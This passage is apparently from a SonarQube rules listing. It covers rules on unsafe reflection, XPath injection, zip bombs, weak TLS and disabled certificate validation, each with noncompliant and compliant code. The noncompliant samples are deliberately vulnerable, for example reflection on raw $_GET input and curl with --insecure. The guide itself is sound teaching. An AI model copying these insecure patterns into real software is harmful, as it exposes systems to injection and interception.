  <li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li>
  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker additionally manages to
elevate their privileges as an administrator and attack other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
through a combination of unsafe deserialization and misconfiguration:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>In the following example, the code simulates a feature in an image editing application that allows users to install plugins to add new filters or
effects. It assumes the user will give a known name, such as "SepiaEffect".</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
function apply($effectName)
{
    try {
        $result = call_user_func($effectName, "applyFilter");
    } catch (\Throwable $e) {
        return "Filter Failure";
    }

    if ( $result == TRUE) {
        return "Filter Success";
    }
    else {
        return "Filter Failure";
    }
}

apply($_GET["filter"]);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$EFFECT_ALLOW_LIST = [
    "SepiaEffect",
    "BlackAndWhiteEffect",
    "WaterColorEffect",
    "OilPaintingEffect"
];

function apply($effectName)
{
    global $EFFECT_ALLOW_LIST;
    if (!in_array($effectName, $EFFECT_ALLOW_LIST)) {
        return "Filter Failure";
    }

    try {
        $result = call_user_func($effectName, "applyFilter");
    } catch (\Throwable $e) {
        return "Filter Failure";
    }

    if ( $result == TRUE) {
        return "Filter Success";
    }
    else {
        return "Filter Failure";
    }
}

apply($_GET["filter"]);
</pre>
<h3>How does this work?</h3>
<h4>Pre-Approved commands</h4>
<p>The cleanest way to avoid this defect is to validate the input before using it in a reflection method.</p>
<p>Create a list of authorized and secure classes that you want the application to be able to execute.<br> If a user input does not match an entry in
this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/470">CWE-470 - Use of Externally-Controlled Input to Select Classes or Code ('Unsafe
  Reflection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S2091">
              phpsecurity:S2091
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>XPath injections occur in an application when the application retrieves untrusted data and inserts it into an XML Path (XPath) query without
sanitizing it first.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to XPath injection:<br> After discovering the injection point, attackers insert data into the
vulnerable field to execute malicious commands in the affected XML documents.</p>
<p>The impact of this vulnerability depends on the importance of XML structures in the enterprise.<br> In cases where organizations rely on XML
structures for business-critical operations or where XML is used only for innocuous data transport, the severity of an attack ranges from critical to
harmless.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Data Leaks</h4>
<p>A malicious XPath query allows direct data leakage from one or more databases. Although XML is not as widely used as it once was, this possibility
still exists with configuration files, for example.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query allows the attacker to delete data in the affected XML documents.<br> This threat is particularly insidious if the attacked
organization does not maintain a disaster recovery plan (DRP) and if XML structures are considered important, as missing critical data can disrupt the
regular operations of an organization.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to XPath injection because untrusted data is concatenated to an XPath query without prior
validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
function authenticate(DOMXpath $xpath, string $username, string $password): bool {
    $expression = "/users/user[@name='" . $username . "' and @pass='" . $password . "']";
    $entries = $xpath-&gt;evaluate($expression);

    return $entries.length &gt; 0
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
function authenticate(DOMXpath $xpath, string $username, string $password): bool {
    if (!preg_match("/^[a-zA-Z0-9]*$/", $username) || !preg_match("/^[a-zA-Z0-9]*$/", $password)) {
        return false;
    }

    $expression = "/users/user[@name='" . $username . "' and @pass='" . $password . "']";
    $entries = $xpath-&gt;evaluate($expression);

    return $entries-&gt;length &gt; 0
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the
initially intended logic.</p>
<h4>Validation</h4>
<p>In case XPath parameterized queries are not available, the most secure way to protect against injections is to validate the input before using it
in an XPath query.</p>
<p><strong>Important</strong>: The application must do this validation server-side. Validating this client-side is insecure.</p>
<p>Input can be validated in multiple ways:</p>
<ul>
  <li> By checking against a list of authorized and secure strings that the application is allowed to use in a query. </li>
  <li> By ensuring user input is restricted to a specific range of characters (e.g., the regex <code>/^[a-zA-Z0-9]*$/</code> only allows alphanumeric
  characters.) </li>
  <li> By ensuring user input does not include any XPath metacharacters, such as <code>"</code>, <code>'</code>, <code>/</code>, <code>@</code>,
  <code>=</code>, <code>*</code>, <code>[</code>, <code>]</code>, <code>(</code> and <code>)</code>. </li>
</ul>
<p>If user input is not considered valid, it should be rejected as it is unsafe.</p>
<p>In the compliant solution, a regex match ensures the username and password only contain alphanumeric characters before executing the XPath
query.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html#xpath-injection">OWASP, XPath Injection
  Prevention Cheat Sheet</a> </li>
  <li> <a href="https://web.archive.org/web/20230602194100/https://www.ambionics.io/blog/hacking-watchguard-firewalls">Ambionics, XPath Injection
  Section of "Hacking WatchGuard Firewalls'</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/643">CWE-643 - Improper Neutralization of Data within XPath Expressions</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S5042">
              vbnet:S5042
            </a>
          </td>
          <td>
            <details>
              <p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can
lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of
uncompressed data. To achieve this extreme <a href="https://en.wikipedia.org/wiki/Data_compression_ratio">compression ratio</a>, attackers will
compress irrelevant data (eg: a long string of repeated bytes).</p>
<h2>Ask Yourself Whether</h2>
<p>Archives to expand are untrusted and:</p>
<ul>
  <li> There is no validation of the number of entries in the archive. </li>
  <li> There is no validation of the total size of the uncompressed data. </li>
  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is
  1 to 3. </li>
  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>
  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in
  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
For Each entry As ZipArchiveEntry in archive.Entries
    ' entry.FullName could contain parent directory references ".." and the destinationPath variable could become outside of the desired path
    string destinationPath = Path.GetFullPath(Path.Combine(path, entry.FullName))
    entry.ExtractToFile(destinationPath) ' Sensitive, extracts the entry to a file

    Dim stream As Stream
    stream = entry.Open() ' Sensitive, the entry is about to be extracted
Next
</pre>
<h2>Compliant Solution</h2>
<pre>
Const ThresholdRatio As Double = 10
Const ThresholdSize As Integer = 1024 * 1024 * 1024 ' 1 GB
Const ThresholdEntries As Integer = 10000
Dim TotalSizeArchive, TotalEntryArchive, TotalEntrySize, Cnt As Integer
Dim Buffer(1023) As Byte
Using ZipToOpen As New FileStream("ZipBomb.zip", FileMode.Open), Archive As New ZipArchive(ZipToOpen, ZipArchiveMode.Read)
    For Each Entry As ZipArchiveEntry In Archive.Entries
        Using s As Stream = Entry.Open
            TotalEntryArchive += 1
            TotalEntrySize = 0
            Do
                Cnt = s.Read(Buffer, 0, Buffer.Length)
                TotalEntrySize += Cnt
                TotalSizeArchive += Cnt
                If TotalEntrySize / Entry.CompressedLength &gt; ThresholdRatio Then Exit Do    ' Ratio between compressed And uncompressed data Is highly suspicious, looks Like a Zip Bomb Attack
            Loop While Cnt &gt; 0
        End Using
        If TotalSizeArchive &gt; ThresholdSize Then Exit For       ' The uncompressed data size Is too much for the application resource capacity
        If TotalEntryArchive &gt; ThresholdEntries Then Exit For   ' Too much entries in this archive, can lead to inodes exhaustion of the system
    Next
End Using
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/409">CWE-409 - Improper Handling of Highly Compressed Data (Data Amplification)</a> </li>
  <li> <a href="https://www.bamsoftware.com/hacks/zipbomb/">bamsoftware.com</a> - A better Zip Bomb </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S4423">
              vbnet:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul>
  <li> SSL versions 1.0, 2.0 and 3.0 </li>
  <li> TLS versions 1.0 and 1.1 </li>
</ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>These samples use a default TLS algorithm, which is a weak cryptographical algorithm: TLSv1.0.</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
Imports System.Net
Imports System.Security.Authentication

Public Sub Encrypt()
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls ' Noncompliant
End Sub
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
Imports System.Net.Http
Imports System.Security.Authentication

Public Sub Encrypt()
    Dim Handler As New HttpClientHandler With {
        .SslProtocols = SslProtocols.Tls ' Noncompliant
    }
End Sub
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
Imports System.Net
Imports System.Security.Authentication

Public Sub Encrypt()
    ServicePointManager.SecurityProtocol = _
        SecurityProtocolType.Tls12 _
        Or SecurityProtocolType.Tls13
End Sub
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
Imports System.Net.Http
Imports System.Security.Authentication

Public Sub Encrypt()
    Dim Handler As New HttpClientHandler With {
        .SslProtocols = SslProtocols.Tls12
    }
End Sub
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S4423">
              docker:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul>
  <li> SSL versions 1.0, 2.0 and 3.0 </li>
  <li> TLS versions 1.0 and 1.1 </li>
</ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in cURL</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
FROM ubuntu:22.04

# Noncompliant
RUN curl --tlsv1.0 -O https://tlsv1-0.example.com/downloads/install.sh
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
FROM ubuntu:22.04

RUN curl --tlsv1.2 -O https://tlsv1-3.example.com/downloads/install.sh
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S4830">
              docker:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.
Certificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>
<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled certificate validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
FROM ubuntu:22.04

# Noncompliant
RUN curl --insecure -O https://expired.example.com/downloads/install.sh
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
FROM ubuntu:22.04

RUN curl -O https://new.example.com/downloads/install.sh
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/295">CWE-295 - Improper Certificate Validation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S4423">
              azureresourcemanager:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul>
  <li> SSL versions 1.0, 2.0 and 3.0 </li>
  <li> TLS versions 1.0 and 1.1 </li>
</ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Databases</h2>
<h3>Code examples</h3>
<p>The following code samples are equivalent For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformysql/servers">Azure
Database for MySQL servers</a>, <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbforpostgresql/servers">Azure Database for
PostgreSQL servers</a>, and <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformariadb/servers">Azure Database for MariaDB
servers</a>.</p>
<p>For all of these, there is no minimal TLS version enforced by default.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.DBforMySQL/servers",
      "apiVersion": "2017-12-01",
      "name": "example",
      "properties": {
        "minimalTlsVersion": "TLS1_0"
      }
    }
  ]
}
</pre>
<pre data-diff-id="3" data-diff-type="noncompliant">
resource mysqlDbServer 'Microsoft.DBforMySQL/servers@2017-12-01' = {
  name: 'example'
  properties: {
    minimalTlsVersion: 'TLS1_0' // Noncompliant
  }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.DBforMySQL/servers",
      "apiVersion": "2017-12-01",
      "name": "example",
      "properties": {
        "minimalTlsVersion": "TLS1_2"
      }
    }
  ]
}
</pre>
<pre data-diff-id="3" data-diff-type="compliant">
resource mysqlDbServer 'Microsoft.DBforMySQL/servers@2017-12-01' = {
  name: 'example'
  properties: {
    minimalTlsVersion: 'TLS1_2'
  }
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
